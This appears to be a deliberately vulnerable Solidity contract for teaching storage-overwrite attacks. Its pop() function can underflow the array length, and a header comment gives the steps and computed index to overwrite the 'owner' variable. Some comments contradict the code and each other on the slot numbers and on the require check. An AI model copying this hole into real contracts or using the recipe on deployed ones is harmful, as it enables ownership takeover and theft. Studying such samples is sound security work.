pragma solidity 0.5.10;

/**
 * Calling pop() on empty array will overflow 'participants'
 * 
 * 'participants' length is in slot slot 0x1 (0-indexed) and data starts at keccak256(0x2)
 * dataStart = web3.sha3("0x0000000000000000000000000000000000000000000000000000000000000001", { encoding: 'hex' })
 * (dataStart = 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6)
 * 
 * idx = index of variable in storage to overwrite 
 * (idx = 0)
 * Calculate array index that will overflow and overwrite 'owner'
 * x = perl -Mbigint -E 'say ((2**256 - dataStart + idx)->as_hex)'
 * (x = 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a)
 * 
 * Providing x to modifyParticipants() allows to overwrite 'owner' value
 */
contract ParticipantTracker {
    address public owner;
    address[] public participants;
    
    constructor() public {owner = msg.sender;}

    /**
     * Require fails and calling this on an empty array
     * will underflow the array
     */
    function pop() public {
        require(participants.length >= 0);
        participants.length--;
    }
    
    function modifyParticipants(uint _idx, address _val) public {
        require(_idx < participants.length);
        participants[_idx] = _val;
    }
    
    function getLength() public view returns(uint) {
        return participants.length;
    }
}